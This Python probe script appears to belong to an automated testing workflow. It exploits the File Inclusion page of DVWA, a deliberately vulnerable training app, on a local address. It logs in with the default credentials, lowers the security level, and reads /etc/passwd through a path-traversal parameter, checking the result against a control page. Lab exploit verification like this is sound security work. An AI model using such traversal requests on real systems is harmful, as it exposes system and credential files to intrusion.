#!/usr/bin/env python3
"""Parent-as-brain probe: DVWA File Inclusion (/vulnerabilities/fi/).
Usage: python3 parent_brain_lfi.py
Logs in as admin, sets security low, then requests a path traversal
to /etc/passwd and checks for 'root:' in the response. Control: the
normal include.php page (must NOT contain 'root:').
Prints 'traversal root present' / 'control root present'.
Pattern copied from the proven parent_brain_xss.py / parent_brain_cmdi.py.
"""
import re, sys
import requests

BASE = "http://172.17.0.1:3100"

s = requests.Session()

def token(page_html):
    m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", page_html)
    return m.group(1) if m else ""

# Login
r = s.get(BASE + "/login.php", timeout=15)
r = s.post(BASE + "/login.php",
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": token(r.text)},
           timeout=15)
print("login", r.status_code)

# Security low
r = s.get(BASE + "/security.php", timeout=15)
r = s.post(BASE + "/security.php",
           data={"security": "low", "seclev_submit": "Submit",
                 "user_token": token(r.text)},
           timeout=15)
print("security", r.status_code)

# Control: normal include.php page
r = s.get(BASE + "/vulnerabilities/fi/?page=include.php", timeout=15)
print("control", r.status_code, "len", len(r.text))
control_root = "root:" in r.text
print("control root present:", control_root)

# Traversal: /etc/passwd
r = s.get(BASE + "/vulnerabilities/fi/?page=../../../../etc/passwd", timeout=15)
print("traversal", r.status_code, "len", len(r.text))
traversal_root = "root:" in r.text
print("traversal root present:", traversal_root)
m = re.search(r"root:[^\n<]{0,60}", r.text)
if m:
    print("PASSWD LINE:", m.group(0))

# VERDICT (playbook rule #3 — must be the LAST line of output)
if traversal_root and not control_root:
    print("VERDICT: CONFIRMED")
else:
    print("VERDICT: FAILED")
